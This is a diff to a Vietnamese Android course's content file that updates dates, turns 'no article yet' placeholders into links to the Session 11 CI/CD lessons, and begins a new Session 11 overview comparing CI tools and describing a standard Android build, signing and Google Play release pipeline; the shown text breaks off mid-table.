@@ -4461,7 +4461,7 @@ apksigner verify --verbose app-release.apk</code></pre>
       'Xử lý được việc kiểm thử AAB cục bộ bằng bundletool CLI.'
     ],
     knowledgeGap: 'Không nắm vững AAB và Dynamic Delivery khiến lập trình viên lãng phí dung lượng tải về của người dùng, gặp ClassNotFoundException khi dùng Dynamic Feature Module, không biết cách test AAB cục bộ khi không qua Play Console, và nhầm lẫn giữa upload key và app signing key của Play App Signing.',
-    updatedAt: '2026-11-08',
+    updatedAt: '2026-11-10',
     readTime: '25 phút',
     content: `
 <h2>Vấn đề cần giải quyết</h2>
@@ -4943,7 +4943,7 @@ class PaymentActivity : AppCompatActivity() {
 </ul></li>
   <li><strong>Downstream Topics</strong>:
 <ul>
-  <li><code>android.cicd.overview</code>: tự động build và đẩy AAB lên Play Console trong pipeline CI/CD.</li>
+  <li><a href="../../cicd_and_publish_store/index.md" target="_blank" rel="noopener">Session 11: CI/CD and Publish Store</a> và <a href="../../cicd_and_publish_store/github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a>: tự động build, ký và đẩy AAB lên Google Play trong pipeline CI/CD.</li>
 </ul></li>
 </ul>
 
@@ -5012,7 +5012,7 @@ Object.assign(ANDROID_CONTENT, {
       'Áp dụng được Build Type vào CI/CD và Firebase App Distribution để phân phối bản build cho QA.'
     ],
     knowledgeGap: 'Nhầm lẫn Build Types với Product Flavors dẫn đến cấu hình sai signing hoặc minify cho bản release, gây lỗi khi phát hành hoặc lọt log debug ra production. Không hiểu cách Gradle/AGP hoạt động khiến khó gỡ lỗi khi build fail và không biết cách tách biến môi trường theo từng Build Type.',
-    updatedAt: '2026-11-09',
+    updatedAt: '2026-11-10',
     readTime: '30 phút',
     content: `
 <h2>Vấn đề cần giải quyết</h2>
@@ -6154,7 +6154,7 @@ buildTypes {
   <li><a href="flavor.md" target="_blank" rel="noopener">Flavor</a> (<code>4.1.1.2</code>): Product Flavor nhân với Build Type thành Build Variant; thứ tự merge Source Set, <code>buildConfigField</code> theo Flavor và chỗ đặt secret, workflow CI/CD mẫu.</li>
   <li><a href="plugin.md" target="_blank" rel="noopener">Plugin</a> (<code>4.1.1.3</code>): ngoài định nghĩa Gradle/AGP, bài học cách AGP và các plugin khác được khai báo và nạp.</li>
   <li><a href="../../../coding_analyst_and_testing/debugging.md" target="_blank" rel="noopener">10.1 Debugging</a>: retrace stack trace của bản release đã bị R8 làm rối bằng <code>mapping.txt</code>.</li>
-  <li>Session 11 (CI/CD): 11.1 Jenkins, 11.2 Bitrise, 11.3 Travis CI, 11.4 Github CI (chưa có bài): chạy các task <code>assemble&lt;BuildType&gt;</code> trong pipeline.</li>
+  <li><a href="../../../cicd_and_publish_store/index.md" target="_blank" rel="noopener">Session 11 (CI/CD)</a>: <a href="../../../cicd_and_publish_store/jenkins.md" target="_blank" rel="noopener">11.1 Jenkins</a>, <a href="../../../cicd_and_publish_store/bitrise.md" target="_blank" rel="noopener">11.2 Bitrise</a>, <a href="../../../cicd_and_publish_store/travis_ci.md" target="_blank" rel="noopener">11.3 Travis CI</a>, <a href="../../../cicd_and_publish_store/github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a>: chạy các task <code>assemble&lt;BuildType&gt;</code>/<code>bundle&lt;BuildType&gt;</code> trong pipeline, ký release bằng secret và đẩy AAB lên Google Play.</li>
 </ul></li>
 </ul>
 
@@ -6201,7 +6201,7 @@ buildTypes {
       'Áp dụng được Flavor vào CI/CD và phân phối đa cửa hàng (multi-store).'
     ],
     knowledgeGap: 'Nhầm lẫn giữa Build Types và Product Flavors dẫn đến việc cấu hình sai mô hình build variant, không tách được code/resource theo flavor, hoặc sinh ra quá nhiều variant không kiểm soát. Không hiểu cơ chế flavorDimensions và merge source set khiến dễ gây lỗi trùng resource, sai applicationId và build fail khi kết hợp library module.',
-    updatedAt: '2026-11-08',
+    updatedAt: '2026-11-10',
     readTime: '35 phút',
     content: `
 <h2>Vấn đề cần giải quyết</h2>
@@ -7215,6 +7215,7 @@ jobs:
 <ul>
   <li><a href="plugin.md" target="_blank" rel="noopener">Plugin</a> (4.1.1.3): hiểu cách AGP và các plugin được khai báo, nạp và ảnh hưởng tới build.</li>
   <li><a href="../tags.md" target="_blank" rel="noopener">Manifest Tags</a> (4.1.2): các thẻ trong <code>AndroidManifest.xml</code>, nơi <code>manifestPlaceholders</code> của flavor chèn giá trị vào.</li>
+  <li><a href="../../../cicd_and_publish_store/github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a> (11.4): pipeline PR check và Release đầy đủ, ký AAB bằng secret và đẩy lên Google Play.</li>
 </ul></li>
   <li><strong>Liên quan:</strong> <a href="../../../session_01/languages/kotlin.md" target="_blank" rel="noopener">Kotlin</a> (1.1.2): ngôn ngữ của <code>build.gradle.kts</code> và các ví dụ trong bài.</li>
 </ul>
@@ -44750,7 +44751,7 @@ if (response.exception == null) showProduct(response.data!!.product!!)</code></p
       'Áp dụng được thứ tự học đề xuất và nơi dạy chính của các kiến thức dễ chồng lấn trong session.'
     ],
     knowledgeGap: 'Biết rời rạc từng công cụ mà không thấy chúng là các lớp của cùng một vòng thì sẽ chỉ dựa vào một lớp (test tay, hoặc chờ crash report), sửa bug không kèm test chống lặp, và tối ưu hiệu năng theo cảm giác thay vì số đo.',
-    updatedAt: '2026-11-09',
+    updatedAt: '2026-11-10',
     readTime: '7 phút',
     content: `
 <h2>Vấn đề cần giải quyết</h2>
@@ -44788,7 +44789,7 @@ if (response.exception == null) showProduct(response.data!!.product!!)</code></p
   <li><strong>Viết code:</strong> editor chạy lint trên file đang mở; debugger và Logcat dùng khi thử tính năng (10.1).</li>
   <li><strong>Lint:</strong> quét toàn module, chặn lỗi có mẫu và vi phạm quy ước (10.3).</li>
   <li><strong>Test:</strong> unit test trên JVM cho logic, instrumented và UI test cho phần cần thiết bị (10.2).</li>
-  <li><strong>Cổng trước khi merge:</strong> CI chạy lại lint và test cho mỗi Pull Request (11.4 Github CI (chưa có bài)).</li>
+  <li><strong>Cổng trước khi merge:</strong> CI chạy lại lint và test cho mỗi Pull Request (<a href="../cicd_and_publish_store/github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a>).</li>
   <li><strong>Production:</strong> Crashlytics và Android vitals đo crash, ANR, hiệu năng trên máy người dùng (10.4).</li>
   <li><strong>Chẩn đoán:</strong> tái hiện, khoanh vùng bằng debugger, stack trace, Profiler, LeakCanary (10.1, 10.4).</li>
   <li><strong>Sửa và vá lưới:</strong> sửa nguyên nhân, thêm test (10.2), lint check (10.3) hoặc đo lại (10.4); quay về bước 1.</li>
@@ -44798,7 +44799,7 @@ if (response.exception == null) showProduct(response.data!!.product!!)</code></p
 flowchart LR
     W["(1) Viết code&lt;br/&gt;editor lint, debugger"] --&gt; L["(2) Lint&lt;br/&gt;10.3"]
     L --&gt; T["(3) Test&lt;br/&gt;10.2"]
-    T --&gt; CI["(4) CI trước merge&lt;br/&gt;11.4 chưa có bài"]
+    T --&gt; CI["(4) CI trước merge&lt;br/&gt;11.4 Github CI"]
     CI --&gt; P["(5) Production&lt;br/&gt;Crashlytics, vitals 10.4"]
     P --&gt;|"crash, ANR, chậm"| D["(6) Chẩn đoán&lt;br/&gt;10.1 debug, 10.4 profile"]
     D --&gt; F["(7) Sửa, test chống lặp,&lt;br/&gt;check mới, đo lại"]
@@ -44930,7 +44931,7 @@ flowchart LR
   <li><strong>Chẩn đoán (10.1):</strong> stack trace (đã retrace) chỉ tới <code>Bundle.getParcelable(key, Order::class.java)</code>, overload chỉ có từ API 33; tái hiện ngay trên emulator API 31.</li>
   <li><strong>Sửa và test chống lặp (10.2):</strong> đổi sang <code>BundleCompat.getParcelable(...)</code> của AndroidX; test đọc đơn hàng từ <code>Bundle</code> chạy bằng Robolectric với SDK 31, đỏ trước khi sửa, xanh sau khi sửa.</li>
   <li><strong>Vá lưới ở lớp sớm hơn (10.3):</strong> <code>NewApi</code> vốn bắt được lỗi này nhưng bị <code>@SuppressLint("NewApi")</code> tắt trên cả class; bỏ suppress, nâng <code>NewApi</code> thành <code>fatal</code>.</li>
-  <li><strong>Cổng trước khi merge (11.4, chưa có bài):</strong> lint và test chạy trong CI cho mọi PR.</li>
+  <li><strong>Cổng trước khi merge (<a href="../cicd_and_publish_store/github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a>):</strong> lint và test chạy trong CI cho mọi PR.</li>
 </ol>
 
 <p>Kết quả là <strong>lưới dày hơn</strong> ở hai lớp: thêm một test, và một check không còn bị tắt.</p>
@@ -44975,7 +44976,7 @@ flowchart LR
   <li><a href="../jetpack_compose_ui/index.md" target="_blank" rel="noopener">Session 09 Overview</a>: UI Compose, được test ở 10.2 và tối ưu ở 10.4.</li>
 </ul></li>
   <li><strong>Trong session:</strong> <a href="debugging.md" target="_blank" rel="noopener">10.1 Debugging</a>, <a href="unit_testing.md" target="_blank" rel="noopener">10.2 Unit Testing</a>, <a href="lint.md" target="_blank" rel="noopener">10.3 Lint</a>, <a href="fit_bug_optimization.md" target="_blank" rel="noopener">10.4 Fit / Bug Optimization</a>.</li>
-  <li><strong>Học tiếp:</strong> Session 11, đặc biệt 11.4 Github CI (chưa có bài): tự động hoá bước 4 của vòng.</li>
+  <li><strong>Học tiếp:</strong> <a href="../cicd_and_publish_store/index.md" target="_blank" rel="noopener">Session 11</a>, đặc biệt <a href="../cicd_and_publish_store/github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a>: tự động hoá bước 4 của vòng.</li>
 </ul>
 
 <h2>Tham khảo</h2>
@@ -45011,7 +45012,7 @@ flowchart LR
       'Nhận diện được các sai lầm như sửa khi chưa tái hiện được lỗi, log dữ liệu nhạy cảm, nuốt exception và chỉ đọc dòng đầu của stack trace.'
     ],
     knowledgeGap: 'Nhiều developer debug bằng cách đoán: thêm vài dòng println, sửa thử, chạy lại xem còn lỗi không. Cách đó hay sửa nhầm triệu chứng, để lại log chứa dữ liệu người dùng trong bản release, và bỏ qua công cụ trả lời thẳng câu hỏi: breakpoint có điều kiện, logpoint, truy vấn Logcat, chuỗi Caused by, mapping.txt.',
-    updatedAt: '2026-11-09',
+    updatedAt: '2026-11-10',
     readTime: '21 phút',
     content: `
 <h2>Vấn đề cần giải quyết</h2>
@@ -45605,7 +45606,7 @@ viewModelScope.launch {
   <li><a href="unit_testing.md" target="_blank" rel="noopener">Unit Testing</a>: test tái hiện lỗi ở bước 5.</li>
   <li><a href="lint.md" target="_blank" rel="noopener">Lint</a>: bắt một số lỗi trước khi phải debug.</li>
   <li><a href="fit_bug_optimization.md" target="_blank" rel="noopener">Fit / Bug Optimization</a>: crash, ANR ở production, memory leak, hiệu năng.</li>
-  <li>11.4 Github CI (chưa có bài): chạy test và lint tự động trên mỗi thay đổi.</li>
+  <li><a href="../cicd_and_publish_store/github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a>: chạy test và lint tự động trên mỗi thay đổi.</li>
 </ul></li>
 </ul>
 
@@ -45657,7 +45658,7 @@ viewModelScope.launch {
       'Áp dụng được ktlint, detekt và lint check của Compose thành cổng kiểm tra chạy trước khi merge.'
     ],
     knowledgeGap: 'Nhiều team chỉ thấy lint qua vài dòng gạch vàng trong editor, hoặc tắt abortOnError cho build qua. Hệ quả là lỗi đọc code là thấy (gọi API cao hơn minSdk, thiếu kiểm tra quyền, log dữ liệu nhạy cảm) vẫn lọt ra production, codebase cũ có hàng trăm cảnh báo nên không ai dám bật lint thành lỗi, và quy ước của team chỉ được nhắc miệng trong code review.',
-    updatedAt: '2026-11-09',
+    updatedAt: '2026-11-10',
     readTime: '22 phút',
     content: `
 <h2>Vấn đề cần giải quyết</h2>
@@ -46369,7 +46370,7 @@ if ! ./gradlew ktlintCheck detekt --quiet; then
   exit 1
 fi</code></pre>
 
-<p>Cách viết workflow CI cho bước (4) (job, cache Gradle, upload SARIF) thuộc 11.4 Github CI (chưa có bài).</p>
+<p>Cách viết workflow CI cho bước (4) (job, cache Gradle, lưu report làm artifact, chặn merge khi đỏ) thuộc <a href="../cicd_and_publish_store/github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a>.</p>
 
 <p><strong>Kết quả:</strong> kiểm chứng bằng cách thêm một hàm 10 tham số và một <code>Log.d</code> vào module feature: hook chặn commit với detekt <code>LongParameterList</code> trong vài giây; sửa xong, CI chặn PR với lint <code>DirectLogUsage</code>.</p>
 
@@ -46462,7 +46463,7 @@ class PaymentRepository(...) { ... }</code></pre>
   <li><strong>Học tiếp:</strong>
 <ul>
   <li><a href="fit_bug_optimization.md" target="_blank" rel="noopener">10.4 Fit / Bug Optimization</a>: lỗi không có mẫu tĩnh (memory leak, jank, crash ở production).</li>
-  <li>11.4 Github CI (chưa có bài): đưa <code>ktlintCheck</code>, <code>detekt</code>, <code>lintDebug</code> vào workflow CI.</li>
+  <li><a href="../cicd_and_publish_store/github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a>: đưa <code>ktlintCheck</code>, <code>detekt</code>, <code>lintDebug</code> vào workflow CI.</li>
 </ul></li>
 </ul>
 
@@ -46505,7 +46506,7 @@ class PaymentRepository(...) { ... }</code></pre>
       'Nhận diện được ngưỡng bad behavior của Android vitals và ưu tiên bug theo số người dùng bị ảnh hưởng.'
     ],
     knowledgeGap: 'Developer thường coi "sửa bug" là mở debugger trên máy mình và "tối ưu" là sửa theo cảm giác. Ở production, bug chỉ xảy ra trên một dòng máy, stack trace bị R8 làm rối, ANR không có exception. Không đọc được Crashlytics, vitals, leak trace, trace ANR và không đo bằng Macrobenchmark thì dễ sửa nhầm chỗ và không chứng minh được bản sửa có tác dụng.',
-    updatedAt: '2026-11-09',
+    updatedAt: '2026-11-10',
     readTime: '25 phút',
     content: `
 <p>Theo mục lục, tiêu đề là "Fit / Bug Optimization"; "Fit" được hiểu là <strong>Fix</strong>. Phạm vi gồm hai việc: <strong>sửa bug ở production</strong> (crash, ANR, memory leak) và <strong>tối ưu hiệu năng</strong> (jank, app startup, kích thước app). Logcat, debugger (<a href="debugging.md" target="_blank" rel="noopener">10.1 Debugging</a>) và cách viết test (<a href="unit_testing.md" target="_blank" rel="noopener">10.2 Unit Testing</a>) chỉ được dùng như công cụ.</p>
@@ -47045,7 +47046,7 @@ timeToInitialDisplayMs   min 161.8,   median 178.9,   max 194.6
 StartupBenchmarks_startupCompilationNone
 timeToInitialDisplayMs   min 184.7,   median 196.9,   max 202.9</code></pre>
 
-<p>So <strong>median</strong>, không so một lần chạy (docs có số đo app mẫu Now in Android trên Pixel 7: 324,8 ms không biên dịch, 229,0 ms có Baseline Profile). Commit <code>baseline-prof.txt</code>, sinh lại khi hành trình chính đổi. Kết quả còn được xuất JSON trong <code>build/outputs/connected_android_test_additional_output/</code> để CI so với bản trước (11.4 Github CI, chưa có bài).</p>
+<p>So <strong>median</strong>, không so một lần chạy (docs có số đo app mẫu Now in Android trên Pixel 7: 324,8 ms không biên dịch, 229,0 ms có Baseline Profile). Commit <code>baseline-prof.txt</code>, sinh lại khi hành trình chính đổi. Kết quả còn được xuất JSON trong <code>build/outputs/connected_android_test_additional_output/</code> để CI so với bản trước; cách đưa task Gradle vào CI ở <a href="../cicd_and_publish_store/github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a>.</p>
 
 <h3>10. StrictMode VmPolicy: cảnh báo sớm ở bản debug</h3>
 
@@ -47264,7 +47265,7 @@ val config = runBlocking { withContext(Dispatchers.IO) { configRepository.load()
   <li><strong>Liên quan:</strong> <a href="unit_testing.md" target="_blank" rel="noopener">10.2 Unit Testing</a> (test chống lặp, fake), <a href="lint.md" target="_blank" rel="noopener">10.3 Lint</a> (bắt lỗi trước khi thành crash), <a href="../session_04/components/services/google_service.md" target="_blank" rel="noopener">Google Service</a> (tích hợp Firebase), <a href="../jetpack_compose_ui/remember_and_recomposition.md" target="_blank" rel="noopener">Remember và Recomposition</a> (jank của Compose), <a href="../session_07/design_pattern/singleton_pattern.md" target="_blank" rel="noopener">Singleton Pattern</a> và <a href="../session_06/view_binding.md" target="_blank" rel="noopener">View Binding</a> (nguồn leak), <a href="../session_01/output_packages/apk_files.md" target="_blank" rel="noopener">APK</a> và <a href="../session_01/output_packages/aab_files.md" target="_blank" rel="noopener">AAB</a> (kích thước gói), <a href="index.md" target="_blank" rel="noopener">Session 10 Overview</a>.</li>
   <li><strong>Học tiếp:</strong>
 <ul>
-  <li>11.4 Github CI (chưa có bài): chạy lint, test, benchmark trước khi merge.</li>
+  <li><a href="../cicd_and_publish_store/github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a>: chạy lint, test trước khi merge và đẩy bản release lên Google Play.</li>
 </ul></li>
 </ul>
 
@@ -47294,6 +47295,2572 @@ val config = runBlocking { withContext(Dispatchers.IO) { configRepository.load()
     `
   },
 
+  'session-11-overview': {
+    title: 'Session 11 Overview',
+    summary: 'Tổng quan Session 11 — CI/CD and Publish Store. CI là tích hợp thay đổi vào nhánh chính thường xuyên, mỗi lần đều build và test tự động; Continuous Delivery giữ mọi bản luôn phát hành được, Continuous Deployment tự động đưa nó lên production. Trang dựng mental model pipeline Android, so sánh bốn tool CI và đề xuất thứ tự học.',
+    status: 'published',
+    difficulty: 'intermediate',
+    estimatedReadingTime: '8 phút',
+    depth: 'overview',
+    tags: ['android', 'session-11', 'cicd', 'overview', 'continuous-integration', 'continuous-delivery', 'google-play'],
+    domain: 'Android',
+    module: 'Session 11',
+    prerequisites: ['android.coding_analyst.overview', 'android.manifest.build_types', 'android.manifest.product_flavors', 'android.output_packages.aab_files'],
+    related: ['android.cicd.github_ci', 'android.cicd.jenkins', 'android.cicd.bitrise', 'android.cicd.travis_ci', 'android.testing.lint', 'android.testing.unit_testing', 'android.testing.fit_bug_optimization', 'android.output_packages.apk_files', 'android.manifest.plugin'],
+    learningOutcomes: [
+      'Phân biệt được Continuous Integration, Continuous Delivery và Continuous Deployment, và vì sao app Android thường dừng ở Continuous Delivery cho production.',
+      'Giải thích được các stage của pipeline Android từ trigger tới giám sát sau phát hành, và Session nào dạy nội dung của từng stage.',
+      'Phân biệt được Jenkins, Bitrise, Travis CI và GitHub Actions theo kiểu hosting, file cấu hình, hiện trạng và trường hợp nên chọn.',
+      'Áp dụng được thứ tự học đề xuất và nơi dạy chính của các kiến thức dễ chồng lấn trong Session 11.'
+    ],
+    knowledgeGap: 'Không có pipeline thì phát hành phụ thuộc vào máy và trí nhớ của một người: build từ nhánh chưa test, keystore trên laptop, quên tăng versionCode, mất mapping.txt. Biết một tool CI mà thiếu mental model pipeline thì khó chuyển tool, và dễ nhầm Continuous Delivery với tự động đẩy mọi bản lên production.',
+    updatedAt: '2026-11-10',
+    readTime: '8 phút',
+    content: `
+<h2>Vấn đề cần giải quyết</h2>
+
+<p>Session 10 cho bạn lint, test và cách đọc crash. Nếu tất cả chạy <strong>bằng tay, trên máy một người</strong>:</p>
+
+<ol>
+  <li>Pull Request được merge khi chưa ai chạy lint và test.</li>
+  <li>Bản release build từ nhánh lạ, keystore trên laptop, quên tăng <code>versionCode</code> nên Play từ chối.</li>
+  <li>Không ai giữ <code>mapping.txt</code>, crash ở production không đọc được.</li>
+  <li>Bản lỗi tới thẳng 100% người dùng.</li>
+</ol>
+
+<p>Session 11 trả lời: <strong>làm sao để mỗi thay đổi tự động qua cùng một chuỗi kiểm tra, và mỗi bản phát hành được tạo, ký, phân phối theo quy trình lặp lại được</strong>.</p>
+
+<h2>Sau khi học xong</h2>
+
+<ul>
+  <li>Phân biệt được Continuous Integration, Continuous Delivery và Continuous Deployment, và vì sao app Android thường dừng ở Continuous Delivery cho production.</li>
+  <li>Giải thích được các stage của pipeline Android từ trigger tới giám sát sau phát hành, và Session nào dạy nội dung của từng stage.</li>
+  <li>Phân biệt được Jenkins, Bitrise, Travis CI và GitHub Actions theo kiểu hosting, file cấu hình, hiện trạng và trường hợp nên chọn.</li>
+  <li>Áp dụng được thứ tự học đề xuất và nơi dạy chính của các kiến thức dễ chồng lấn trong Session 11.</li>
+</ul>
+
+<h2>CI/CD là gì?</h2>
+
+<p><strong>Continuous Integration (CI, tích hợp liên tục)</strong> là thực hành mỗi developer tích hợp thay đổi vào nhánh chính thường xuyên (ít nhất mỗi ngày), và <strong>mỗi lần tích hợp được build và test tự động</strong> để lỗi lộ ra ngay khi vừa đưa vào. <strong>CD</strong> có hai nghĩa:</p>
+
+<ul>
+  <li><strong>Continuous Delivery (chuyển giao liên tục):</strong> mọi bản đã qua pipeline luôn ở trạng thái <strong>phát hành được bất cứ lúc nào</strong>; đưa lên production là <strong>quyết định của người</strong>, thường chỉ là một nút bấm.</li>
+  <li><strong>Continuous Deployment (triển khai liên tục):</strong> mọi bản qua pipeline <strong>tự động</strong> lên production, không có bước duyệt tay.</li>
+</ul>
+
+<p>Mental model: <strong>pipeline là dây chuyền có các cổng nối tiếp</strong>; mỗi cổng (lint, test, build, ký) cho thay đổi đi tiếp hoặc dừng dây chuyền và báo đỏ. CI là đoạn chạy cho mọi Pull Request, CD kéo dài tới tay người dùng. Tool CI chỉ là <strong>nơi chạy</strong> dây chuyền.</p>
+
+<h2>Cách hoạt động</h2>
+
+<h3>Continuous Delivery và Continuous Deployment trên Android</h3>
+
+<p>Web rollback bằng cách deploy lại bản cũ; app Android đã cài chỉ sửa được bằng <strong>bản mới</strong> có <code>versionCode</code> cao hơn. Vì vậy app Android thường dừng ở <strong>Continuous Delivery</strong>: tự động lên <strong>internal track</strong> hoặc Firebase App Distribution; lên production có người duyệt và đi qua <strong>staged rollout (phát hành theo tỉ lệ)</strong>.</p>
+
+<h3>Pipeline Android</h3>
+
+<p>Trên tool nào, pipeline Android cũng gồm các stage sau:</p>
+
+<ol>
+  <li><strong>Trigger:</strong> mở hoặc cập nhật Pull Request, push lên <code>main</code>, push tag phát hành, chạy tay.</li>
+  <li><strong>Môi trường:</strong> máy build sạch có JDK đúng version AGP cần (<a href="../session_04/android_manifest/package_build_gradle/plugin.md" target="_blank" rel="noopener">Plugin</a>), Android SDK, <strong>cache</strong> Gradle.</li>
+  <li><strong>Kiểm tra tĩnh:</strong> Android Lint, ktlint, detekt (<a href="../coding_analyst_and_testing/lint.md" target="_blank" rel="noopener">10.3</a>).</li>
+  <li><strong>Test:</strong> unit test cho mọi PR; instrumented test trên emulator khi cần (<a href="../coding_analyst_and_testing/unit_testing.md" target="_blank" rel="noopener">10.2</a>).</li>
+  <li><strong>Build:</strong> <code>assemble&lt;Variant&gt;</code> ra APK, <code>bundle&lt;Variant&gt;</code> ra AAB (<a href="../session_04/android_manifest/package_build_gradle/build_types.md" target="_blank" rel="noopener">Build Types</a>, <a href="../session_04/android_manifest/package_build_gradle/flavor.md" target="_blank" rel="noopener">Flavor</a>).</li>
+  <li><strong>Ký:</strong> bản release ký bằng upload key lấy từ <strong>secret</strong> của tool CI, không nằm trong repo (<a href="../session_01/output_packages/aab_files.md" target="_blank" rel="noopener">AAB và Play App Signing</a>).</li>
+  <li><strong>Artifact:</strong> lưu report, APK, AAB, <code>mapping.txt</code> để tải về và truy vết.</li>
+  <li><strong>Phân phối:</strong> bản QA qua Firebase App Distribution; bản phát hành lên các <strong>track</strong> của Google Play: internal (tối đa 100 tester, có sau vài phút), closed (tester được mời), open (ai cũng tham gia được), production. <strong>Staged rollout</strong> phát cho một tỉ lệ người dùng rồi tăng dần, dừng được khi có lỗi. Chi tiết ở <a href="github_ci.md" target="_blank" rel="noopener">11.4</a>.</li>
+  <li><strong>Giám sát:</strong> Crashlytics và Android vitals quyết định tăng rollout hay dừng (<a href="../coding_analyst_and_testing/fit_bug_optimization.md" target="_blank" rel="noopener">10.4</a>).</li>
+</ol>
+
+<div class="archify-embed" data-src="archify/android/s11-android-cicd-pipeline.html" data-title="Pipeline CI/CD của một app Android">
+  <a class="archify-full" href="archify/android/s11-android-cicd-pipeline.html" target="_blank" rel="noopener">Mở toàn màn hình ↗</a>
+</div>
+
+<p>Mũi tên quay lại là vòng chất lượng của <a href="../coding_analyst_and_testing/index.md" target="_blank" rel="noopener">Session 10</a>, giờ chạy tự động.</p>
+
+<h3>Hai pipeline chuẩn của Session 11</h3>
+
+<p>Mỗi bài viết lại <strong>cùng hai pipeline</strong> bằng tool của mình:</p>
+
+<table style="width:100%;border-collapse:collapse;font-size:14px;margin-bottom:1em;">
+  <thead>
+    <tr style="border-bottom:2px solid #30363d;background:var(--bg-card,#161b22);">
+      <th style="padding:8px 12px;text-align:left;">Pipeline</th>
+      <th style="padding:8px 12px;text-align:left;">Trigger</th>
+      <th style="padding:8px 12px;text-align:left;">Stage</th>
+      <th style="padding:8px 12px;text-align:left;">Kiểm chứng</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><strong>PR check</strong></td>
+      <td style="padding:8px 12px;">Mỗi Pull Request vào <code>main</code></td>
+      <td style="padding:8px 12px;">(2) JDK 17, cache → (3)(4)(5) <code>./gradlew lintDebug testDebugUnitTest assembleDebug</code> → (7) report, APK debug</td>
+      <td style="padding:8px 12px;">Check trên PR; đỏ thì chặn merge</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><strong>Release</strong></td>
+      <td style="padding:8px 12px;">Push tag <code>v*</code></td>
+      <td style="padding:8px 12px;">(2) → giải mã keystore từ secret → (5)(6) <code>bundleRelease</code> đã ký → (7) AAB, <code>mapping.txt</code> → (8) internal track</td>
+      <td style="padding:8px 12px;">Bản mới trên internal track</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Secret dùng chung tên ở mọi bài: <code>RELEASE_KEYSTORE_BASE64</code>, <code>RELEASE_STORE_PASSWORD</code>, <code>RELEASE_KEY_ALIAS</code>, <code>RELEASE_KEY_PASSWORD</code>, <code>PLAY_SERVICE_ACCOUNT_JSON</code>.</p>
+
+<h3>Session 11 học những gì?</h3>
+
+<table style="width:100%;border-collapse:collapse;font-size:14px;margin-bottom:1em;">
+  <thead>
+    <tr style="border-bottom:2px solid #30363d;background:var(--bg-card,#161b22);">
+      <th style="padding:8px 12px;text-align:left;"></th>
+      <th style="padding:8px 12px;text-align:left;"><a href="jenkins.md" target="_blank" rel="noopener">11.1 Jenkins</a></th>
+      <th style="padding:8px 12px;text-align:left;"><a href="bitrise.md" target="_blank" rel="noopener">11.2 Bitrise</a></th>
+      <th style="padding:8px 12px;text-align:left;"><a href="travis_ci.md" target="_blank" rel="noopener">11.3 Travis CI</a></th>
+      <th style="padding:8px 12px;text-align:left;"><a href="github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Hosting</td>
+      <td style="padding:8px 12px;">Tự host, open source</td>
+      <td style="padding:8px 12px;">SaaS chuyên mobile</td>
+      <td style="padding:8px 12px;">SaaS, có bản tự host</td>
+      <td style="padding:8px 12px;">SaaS trong GitHub, có self-hosted runner</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">File cấu hình</td>
+      <td style="padding:8px 12px;"><code>Jenkinsfile</code></td>
+      <td style="padding:8px 12px;"><code>bitrise.yml</code></td>
+      <td style="padding:8px 12px;"><code>.travis.yml</code></td>
+      <td style="padding:8px 12px;"><code>.github/workflows/*.yml</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Đơn vị pipeline</td>
+      <td style="padding:8px 12px;"><code>stages</code> → <code>stage</code> → <code>steps</code>, chạy trên agent</td>
+      <td style="padding:8px 12px;">Workflow gồm Step; Pipeline nối Workflow</td>
+      <td style="padding:8px 12px;">Build → job → phase cố định</td>
+      <td style="padding:8px 12px;">Workflow → job → step, chạy trên runner</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Điểm mạnh với Android</td>
+      <td style="padding:8px 12px;">Toàn quyền máy build, dữ liệu ở mạng nội bộ</td>
+      <td style="padding:8px 12px;">Stack có Android SDK, Step ký và deploy Play, chạy cả iOS</td>
+      <td style="padding:8px 12px;"><code>language: android</code> cài SDK component</td>
+      <td style="padding:8px 12px;">Gắn với PR, runner có Android SDK</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Hiện trạng</td>
+      <td style="padding:8px 12px;">Đang phát triển; phải tự vận hành</td>
+      <td style="padding:8px 12px;">Đang phát triển, tính phí theo gói</td>
+      <td style="padding:8px 12px;"><code>travis-ci.org</code> tắt từ 06/2021, Free Trial không mở, không có macOS</td>
+      <td style="padding:8px 12px;">Lựa chọn mặc định với repo GitHub</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Khi nào chọn</td>
+      <td style="padding:8px 12px;">Đã có Jenkins, dữ liệu phải ở mạng công ty</td>
+      <td style="padding:8px 12px;">Team mobile không muốn vận hành máy build</td>
+      <td style="padding:8px 12px;">Duy trì dự án đang dùng Travis</td>
+      <td style="padding:8px 12px;">Code ở GitHub, muốn bắt đầu nhanh</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>11.4 là <strong>bài chính</strong>, gồm toàn bộ <strong>Publish Store</strong>; ba bài còn lại chỉ dạy phần riêng của tool.</p>
+
+<h3>Nơi dạy chính của các kiến thức dễ chồng lấn</h3>
+
+<table style="width:100%;border-collapse:collapse;font-size:14px;margin-bottom:1em;">
+  <thead>
+    <tr style="border-bottom:2px solid #30363d;background:var(--bg-card,#161b22);">
+      <th style="padding:8px 12px;text-align:left;">Kiến thức</th>
